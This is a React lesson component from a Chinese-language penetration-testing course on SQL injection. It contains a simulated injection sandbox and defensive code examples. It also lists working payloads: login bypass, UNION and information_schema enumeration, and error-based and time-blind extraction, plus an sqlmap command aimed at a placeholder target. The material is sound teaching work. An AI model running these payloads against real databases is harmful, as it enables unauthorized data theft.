import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './LessonCommon.css';

/* ── SQL 注入靶场模拟器 ── */
const VULNERABLE_DB = {
  users: [
    { id: 1, username: 'alice',   password: 'hashed_pw', role: 'user',   email: 'alice@corp.com' },
    { id: 2, username: 'bob',     password: 'hashed_pw', role: 'user',   email: 'bob@corp.com' },
    { id: 3, username: 'admin',   password: 'hashed_pw', role: 'admin',  email: 'admin@corp.com' },
    { id: 4, username: 'charlie', password: 'hashed_pw', role: 'user',   email: 'charlie@corp.com' },
  ],
  products: [
    { id: 1, name: 'Laptop', price: 999, stock: 50 },
    { id: 2, name: 'Phone',  price: 699, stock: 100 },
  ],
};

function simulateSQLi(input) {
  // Simulate vulnerable: "SELECT * FROM users WHERE username = '" + input + "'"
  const clean = input.toLowerCase().replace(/\s+/g, ' ').trim();
  
  // 经典绕过登录
  if (clean.includes("' or '1'='1") || clean.includes("' or 1=1") || clean.includes("'or'1'='1")) {
    return { query: `SELECT * FROM users WHERE username='${input}'`, result: VULNERABLE_DB.users, vuln: true, desc: '🚨 OR 条件恒真！返回全部用户数据' };
  }
  if (clean.includes("admin' --") || clean.includes("admin'--") || clean.includes("' --")) {
    return { query: `SELECT * FROM users WHERE username='${input}'`, result: [VULNERABLE_DB.users[2]], vuln: true, desc: '🚨 注释掉了密码验证，以 admin 登录成功！' };
  }
  if (clean.includes('union select') && clean.includes('information_schema')) {
    return {
      query: `SELECT * FROM users WHERE id='${input}'`,
      result: [{ TABLE_NAME: 'users' }, { TABLE_NAME: 'products' }, { TABLE_NAME: 'orders' }, { TABLE_NAME: 'payments' }],
      vuln: true, desc: '🚨 UNION 注入！获取到数据库所有表名'
    };
  }
  if (clean.includes('union select')) {
    return { query: `SELECT * FROM users WHERE id='${input}'`, result: [{ injected: '数据库版本: MySQL 8.0.32', user: 'app_user@localhost' }], vuln: true, desc: '🚨 UNION 注入成功，可获取数据库版本/用户信息' };
  }
  if (clean.includes("'") || clean.includes('"') || clean.includes('--') || clean.includes(';')) {
    return { query: `SELECT * FROM users WHERE username='${input}'`, result: null, vuln: 'error', desc: '⚠️ SQL 语法错误（注入尝试被解析器发现，但服务器未做防护）' };
  }
  if (clean === '' ) return { query: '', result: null, vuln: false, desc: '请输入' };
  const user = VULNERABLE_DB.users.find(u => u.username === input);
  return { query: `SELECT * FROM users WHERE username='${input}'`, result: user ? [user] : [], vuln: false, desc: user ? '✅ 正常查询：找到用户' : '正常查询：未找到用户' };
}

const SQLI_PAYLOADS = [
  { label: '正常登录',        value: 'alice' },
  { label: '注释绕过密码',    value: "admin' --" },
  { label: "OR 恒真（万能）", value: "' OR '1'='1" },
  { label: 'UNION 探测',      value: "1' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables-- -" },
];

function SQLiSimulator() {
  const [input, setInput] = useState('');
  const [result, setResult] = useState(null);
  const [history, setHistory] = useState([]);

  const run = () => {
    const res = simulateSQLi(input);
    setResult(res);
    if (input) setHistory(h => [{ input, ...res }, ...h.slice(0, 4)]);
  };

  return (
    <div className="sec-interactive">
      <h3>💉 SQL 注入靶场模拟器
        <span style={{ fontSize: '0.7rem', color: '#fbbf24', fontWeight: 600 }}>🎯 仅教学用途，模拟环境</span>
      </h3>
      <div style={{ fontFamily: 'JetBrains Mono', fontSize: '0.72rem', color: '#5a1a1a', marginBottom: '0.75rem' }}>
        后端代码（存在漏洞）：<span style={{ color: '#f87171' }}>SELECT * FROM users WHERE username='<strong>{input || 'INPUT'}</strong>'</span>
      </div>
      
      <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.4rem', marginBottom: '0.75rem' }}>
        {SQLI_PAYLOADS.map(p => (
          <button key={p.label} onClick={() => { setInput(p.value); setResult(null); }}
            style={{ padding: '0.35rem 0.7rem', borderRadius: '6px', fontSize: '0.75rem', cursor: 'pointer', fontWeight: 600,
              border: '1px solid rgba(220,38,38,0.3)', background: 'rgba(220,38,38,0.07)', color: '#f87171' }}>
            {p.label}
          </button>
        ))}
      </div>

      <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '0.75rem' }}>
        <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && run()}
          placeholder="输入用户名（尝试注入 Payload）"
          style={{ flex: 1, padding: '0.5rem 0.75rem', background: '#050001', border: '1px solid rgba(220,38,38,0.25)', borderRadius: '6px', color: '#f0d0d0', fontFamily: 'JetBrains Mono', fontSize: '0.82rem', outline: 'none' }} />
        <button className="sec-btn attack" onClick={run}>注入！</button>
      </div>

      {result && (
        <div style={{ marginBottom: '0.75rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono', fontSize: '0.72rem', color: '#5a1a1a', marginBottom: '0.4rem' }}>
            📋 执行 SQL：<span style={{ color: result.vuln ? '#f87171' : '#22c55e' }}>{result.query}</span>
          </div>
          <div style={{ padding: '0.5rem 0.75rem', borderRadius: '6px', background: result.vuln === true ? 'rgba(220,38,38,0.08)' : result.vuln === 'error' ? 'rgba(251,191,36,0.08)' : 'rgba(34,197,94,0.08)', border: `1px solid ${result.vuln === true ? 'rgba(220,38,38,0.3)' : result.vuln === 'error' ? 'rgba(251,191,36,0.3)' : 'rgba(34,197,94,0.3)'}`, fontSize: '0.82rem', color: result.vuln === true ? '#f87171' : result.vuln === 'error' ? '#fbbf24' : '#22c55e', fontWeight: 700 }}>
            {result.desc}
          </div>
          {result.result && result.result.length > 0 && (
            <div style={{ marginTop: '0.5rem', background: '#040001', borderRadius: '6px', padding: '0.5rem', fontFamily: 'JetBrains Mono', fontSize: '0.7rem', color: '#f0d0d0', maxHeight: 140, overflow: 'auto' }}>
              {JSON.stringify(result.result, null, 2)}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

const SQLI_TYPES = [
  { name: '经典注入', code: `-- 报错注入：通过错误信息提取数据
' AND extractvalue(1, concat(0x7e,(SELECT database())))--

-- Union 注入：拼接额外查询列
1' UNION SELECT username,password,3,4 FROM users--

-- 盲注（布尔型）：根据页面响应判断真假
' AND (SELECT substring(username,1,1) FROM users WHERE id=1)='a'--` },
  { name: '时间盲注', code: `-- 时间注入：根据响应时间判断条件真假
-- (无回显时使用，最耗时)
'; IF(1=1, SLEEP(3), 0)--      → 延迟3秒=条件为真

-- 逐字符提取数据库版本
'; IF(SUBSTRING(version(),1,1)='8', SLEEP(2), 0)--
-- 响应延迟2秒 → 数据库版本首字符是8 ✓

-- sqlmap 自动化（仅限授权测试！）
sqlmap -u "http://target.com/user?id=1" --dbs --batch` },
  { name: '防御：参数化', code: `# ✅ 防御1：参数化查询（根本解决方案）
# Python + psycopg2
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, hashed_password)   # 参数永远不被解释为 SQL
)

# ✅ 防御2：ORM（内置参数化）
user = User.query.filter_by(username=username).first()

# ✅ 防御3：输入白名单验证
import re
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    raise ValueError("非法用户名")

# ✅ 防御4：最小数据库权限
# 应用账号只有 SELECT/INSERT/UPDATE，无 DROP/TRUNCATE` },
];

export default function LessonSQLi() {
  const navigate = useNavigate();
  const [activeType, setActiveType] = useState(0);

  return (
    <div className="lesson-sec">
      <div className="sec-badge">💉 module_03 — SQL 注入</div>
      <div className="sec-disclaimer">⚠️ 靶场模拟器为纯前端演示，不连接真实数据库。现实中请在授权环境（DVWA/SQLite靶机）练习。</div>

      <div className="sec-hero">
        <h1>SQL 注入：检测、利用与防御</h1>
        <p>SQL 注入在 OWASP TOP 10 常年前三，每年因此泄露数亿条用户数据。根本原因是<strong>未能将数据与代码分离</strong>——用户输入被当作 SQL 语句的一部分执行。</p>
      </div>

      {/* 靶场模拟器 */}
      <SQLiSimulator />

      {/* 注入类型 */}
      <div className="sec-section">
        <h2 className="sec-section-title">🗂️ SQL 注入类型 + 防御代码</h2>
        <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '0.75rem' }}>
          {SQLI_TYPES.map((t, i) => (
            <button key={i} onClick={() => setActiveType(i)}
              className={`sec-btn ${activeType === i ? 'attack' : ''}`} style={{ fontSize: '0.82rem' }}>{t.name}</button>
          ))}
        </div>
        <div className="sec-terminal">
          <div className="sec-terminal-header">
            <div className="sec-terminal-dot" style={{ background: '#ef4444' }} />
            <div className="sec-terminal-dot" style={{ background: '#f59e0b' }} />
            <div className="sec-terminal-dot" style={{ background: '#22c55e' }} />
            <span style={{ marginLeft: '0.5rem', color: SQLI_TYPES[activeType].name.includes('防御') ? '#22c55e' : '#f87171' }}>
              {SQLI_TYPES[activeType].name}
            </span>
          </div>
          <div className="sec-terminal-body" style={{ color: SQLI_TYPES[activeType].name.includes('防御') ? '#c0ffd0' : '#ffd0d0', fontSize: '0.75rem' }}>
            {SQLI_TYPES[activeType].code}
          </div>
        </div>
      </div>

      <div className="sec-nav">
        <button className="sec-btn" onClick={() => navigate('/course/security-pentest/lesson/web-sec')}>← 上一模块</button>
        <button className="sec-btn attack" onClick={() => navigate('/course/security-pentest/lesson/xss-csrf')}>下一模块：XSS / CSRF →</button>
      </div>
    </div>
  );
}
